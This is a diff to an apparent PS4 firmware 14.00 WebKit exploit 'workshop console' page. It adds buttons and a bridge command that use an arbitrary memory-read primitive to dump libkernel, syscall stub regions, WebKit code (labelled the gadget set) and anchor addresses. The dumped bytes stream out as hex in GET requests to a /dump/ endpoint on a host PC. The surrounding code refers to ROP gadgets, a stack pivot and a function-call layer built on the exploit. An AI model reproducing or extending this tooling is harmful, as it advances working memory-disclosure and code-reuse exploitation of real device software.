@@ -28,7 +28,22 @@
   page) redirects here with ?slots=5000000&n=512&live=1.
 -->
 <meta charset="utf-8"><title>ps4 14.00 - workshop console</title>
-<body style="font:13px monospace"><pre id="out"></pre>
+<body style="font:13px monospace">
+<style>
+  #extbar button { display:block; width:480px; margin:8px 0; padding:12px 0;
+      font-size:17px; color:#fff; background:#1d4ed8; border:0;
+      border-radius:8px; }
+  #extbar button.b2 { background:#7c2d12; font-size:15px; }
+  #extst { color:#4ade80; margin-bottom:6px; }
+</style>
+<div id="extbar">
+<button onclick="EXT_click('libkernel')">EXTRACT - libkernel window (the 302-stub table)</button>
+<button onclick="EXT_click('stubzone')">EXTRACT - stub zone only (fast)</button>
+<button onclick="EXT_click('webkit')">EXTRACT - WebKit text slice (low 2 MB: the gadget set)</button>
+<button class="b2" onclick="EXT_click('anchors')">EXTRACT - proof anchors (base, pair door, getpid stub, errno gadget)</button>
+<div id="extst">extraction is one click once WORKSHOP-READY - files land in extraction/ on the PC</div>
+</div>
+<pre id="out"></pre>
 <script>
 "use strict";
 var Q = new URLSearchParams(location.search);
@@ -137,6 +152,17 @@ function mark(tag, extra) {
 
 function hex(value) {
     return "0x" + value.toString(16);
+}
+
+// ---- one-click extraction (UI entry; the armed live layer installs the
+// real runner - buttons stay inert until WORKSHOP-READY)
+var EXT_ready = false;
+function EXT_click(what) {
+    if (!EXT_ready) {
+        mark("EXT-FAIL", "reason=primitive-not-armed-wait-for-WORKSHOP-READY");
+        return;
+    }
+    EXT_run(what);
 }
 
 function buffer(size) {
@@ -1832,6 +1858,7 @@ function r4Main(base, exeE) {
         + "-gadget-reparation=pattern-0x8000-0x20000-min-0x4000"
         + "-stub-exact=+0x6cf0-(libkernel window dump)"
         + "-pivot_sp=0x" + R4_PIVOT_VIEW_SP.toString(16));
+    WK_BASE = base;   // extraction anchor: the locked WebKit base
 
     if (!r4BufAddrSelfTest())
         return "FCALL-BUFADDR-FAIL";
@@ -1994,6 +2021,7 @@ var R12_WHOLEN = Math.max(0, Math.min(512,
 var R12_KEEP = [];
 var LIBK_ERRORFN = 0;
 var LIVE_KEEP = false;
+var WK_BASE = 0;   // the locked WebKit module base (set by the fcall layer)
 function R12_RV0(r) {
     return r.hi === 0 && (r.lo >>> 0) === 0;
 }
@@ -2382,6 +2410,10 @@ var STUB_TABLE = {"12":21168,"73":21200,"441":21232,"125":21264,"442":21296,"80"
                 suite.push(["errno-aio_wait", { rax: g2.lo }]);
                 return { id: cmd.id, suite: suite };
             }
+            if (cmd.t === "extract") {
+                EXT_run(cmd.what || "libkernel");
+                return { id: cmd.id, started: cmd.what || "libkernel" };
+            }
             return { id: cmd.id, error: "unknown-command-" + cmd.t };
         }
         // GLOBAL LAB SURFACE - the whole workshop is drivable by
@@ -2394,6 +2426,91 @@ var STUB_TABLE = {"12":21168,"73":21200,"441":21232,"125":21264,"442":21296,"80"
             },
             G: G, c: c
         };
+        // ---- ONE-CLICK EXTRACTION ----------------------------------------
+        // The buttons at the top of the page and {"t":"extract","what":...}
+        // over the bridge. Streams chunks to the host's /dump/ endpoint,
+        // which assembles the files under extraction/ on the PC (see
+        // extraction/README.md for the file map).
+        var EXT_CHUNK = 0x400, EXT_PER_TICK = 6, EXT_TICK_MS = 60;
+        var EXT_JOBS = {
+            libkernel: [["libkernel-window", LIBK_ERRORFN, 0x6a000]],
+            stubzone: [["stubzone", LIBK_ERRORFN + 0x52b0, 0x7a00 - 0x52b0]],
+            webkit: WK_BASE ? [["webkit-text", WK_BASE, 0x200000]] : null,
+            anchors: WK_BASE ? [
+                ["anchor-expm1", WK_BASE + 0x2586880, 0x100],
+                ["anchor-parseint", WK_BASE + 0xD5C60, 0x100],
+                ["anchor-imp-error", WK_BASE + 0x3CB8CC8, 0x8],
+                ["anchor-base-start", WK_BASE, 0x200],
+                ["stub-getpid", LIBK_ERRORFN + 0x6cf0, 0x20],
+                ["errno-gadget", LIBK_ERRORFN + 0x6a2a, 0x10]
+            ] : null
+        };
+        var EXT_busy = false;
+        function EXT_hex(b) {
+            return (b < 16 ? "0" : "") + b.toString(16);
+        }
+        function EXT_stream(name, start, len, done) {
+            var off = 0;
+            function tick() {
+                for (var n = 0; n < EXT_PER_TICK && off < len; ++n) {
+                    var cl = Math.min(EXT_CHUNK, len - off);
+                    var h = "";
+                    for (var i = 0; i < cl; ++i)
+                        h += EXT_hex(ext_read8(start + off + i));
+                    try {
+                        var x = new XMLHttpRequest();
+                        x.open("GET", "/dump/" + name + "/"
+                            + off.toString(16) + "/" + h, true);
+                        x.send();
+                    } catch (_) {}
+                    off += cl;
+                }
+                var st = document.getElementById("extst");
+                if (st) st.textContent = "extracting " + name + ": 0x"
+                    + off.toString(16) + " / 0x" + len.toString(16);
+                if (off < len) {
+                    setTimeout(tick, EXT_TICK_MS);
+                } else {
+                    if (st) st.textContent = "extracted " + name + " ("
+                        + len + " bytes) -> extraction/" + name + ".bin";
+                    done();
+                }
+            }
+            setTimeout(tick, 0);
+        }
+        function EXT_run(what) {
+            var jobs = EXT_JOBS[what];
+            if (EXT_busy) {
+                r3Log("EXT-FAIL", "reason=extraction-already-running");
+                r3Flush();
+                return;
+            }
+            if (!jobs) {
+                r3Log("EXT-FAIL", "what=" + what
+                    + "-reason=unknown-or-base-missing");
+                r3Flush();
+                return;
+            }
+            EXT_busy = true;
+            r3Log("EXT-START", "what=" + what + "-files=" + jobs.length
+                + "-dest=extraction-on-the-pc");
+            r3Flush();
+            (function chain(idx) {
+                if (idx >= jobs.length) {
+                    EXT_busy = false;
+                    r3Log("EXT-DONE", "what=" + what);
+                    r3Flush();
+                    bridgeSend({ t: "ext", what: what, done: 1 });
+                    return;
+                }
+                var j = jobs[idx];
+                bridgeSend({ t: "ext", what: what, file: j[0], len: j[2] });
+                EXT_stream(j[0], j[1], j[2], function () {
+                    chain(idx + 1);
+                });
+            })(0);
+        }
+        EXT_ready = true;
         setInterval(function () {
             bridgeSend({ t: "hb", src: "workshop-console", syscalls: syscalls,
                       ws: wsReady ? 1 : 0 });
